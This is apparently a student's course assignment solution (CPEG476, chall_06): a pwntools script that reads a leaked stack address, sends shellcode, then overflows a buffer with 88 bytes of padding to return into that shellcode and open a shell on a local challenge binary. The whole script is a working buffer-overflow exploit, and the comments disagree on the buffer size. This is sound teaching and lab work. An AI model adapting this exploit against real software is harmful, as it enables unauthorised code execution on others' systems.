'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Project 2 --- chall_06
File Description:  

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   69) Symbols       No    0               3               chall_06

File info:
chall_06: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bb31d22b0c8dc2f0dd7a39ca45ef6f9588034ab9, for GNU/Linux 3.2.0, not stripped

Radare2:
afl --> list all functions

Buffer is 96 long; call rax is last 8 bytes store address  here
'''

# Import Libraries
from pwn import *

# Variables
padding = b'a'*88      # Vuln only has 80 byte buffer + 8 RBP
context.arch = "amd64"
shell = asm(shellcraft.sh())
shellLen = len(shell)
print("Shell Length: ", shellLen)   # For Debugging

# Start process and find leak
p=process("./chall_06")
resp=p.recvuntil(b': ')
leak=p.recvuntil(b'\n')
leakInt=p64(int(leak,16))

# Craft payload to get shell on stack
payload=b''
payload+=shell
print("SENDING SHELL:")
p.sendline(payload)

# Call vulnerable leak, will pop shell

payload=b''
payload+=padding+leakInt
p.sendline(b"\n")
p.sendlineafter(b"I drink milk even though i'm lactose intolerant:",payload)
print("RETURNING TO VULN")

p.interactive()
